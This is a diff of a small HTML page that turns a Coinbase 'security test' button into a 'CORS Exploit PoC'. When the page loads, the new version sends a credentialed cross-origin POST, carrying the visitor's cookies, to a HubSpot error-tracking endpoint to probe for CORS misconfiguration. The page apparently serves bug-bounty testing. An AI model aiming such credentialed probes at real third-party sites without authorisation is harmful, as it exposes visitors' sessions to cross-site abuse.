@@ -1,32 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Coinbase Security Test</title>
-    <script>
-        // XSS/CSRF Test Fonksiyonu
-        function testCoinbase() {
-            fetch('https://sessions.coinbase.com/', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Origin': 'https://vukuff.github.io'
-                },
-                body: JSON.stringify({test: "security_test_from_github"})
-            })
-            .then(response => response.text())
-            .then(data => {
-                document.getElementById("result").innerText = data;
-                console.log("Test Sonucu:", data);
-            })
-            .catch(error => {
-                console.error("Hata:", error);
-            });
-        }
-    </script>
+  <title>CORS Exploit PoC</title>
 </head>
 <body>
-    <h1>Coinbase Security Test</h1>
-    <button onclick="testCoinbase()">Testi Başlat</button>
-    <pre id="result"></pre>
+  <h1>Loading attack...</h1>
+  <script>
+    fetch("https://exceptions-eu1.hubspot.com/frontend/observability/page-tracking/store/?sentry_version=7&sentry_client=raven-js%2F3.19.1&deployable=notifications", {
+      method: "POST",
+      mode: "cors",
+      credentials: "include",
+      headers: {
+        "Content-Type": "text/plain;charset=UTF-8"
+      },
+      body: JSON.stringify({
+        "message": "If this reaches HubSpot with victim's cookies, CORS is vulnerable.",
+        "level": "info"
+      })
+    })
+    .then(res => {
+      if (res.ok) {
+        alert("CORS with credentials: possible data exfil!");
+      } else {
+        alert("Request failed or blocked.");
+      }
+    })
+    .catch(err => console.error("Error:", err));
+  </script>
 </body>
 </html>
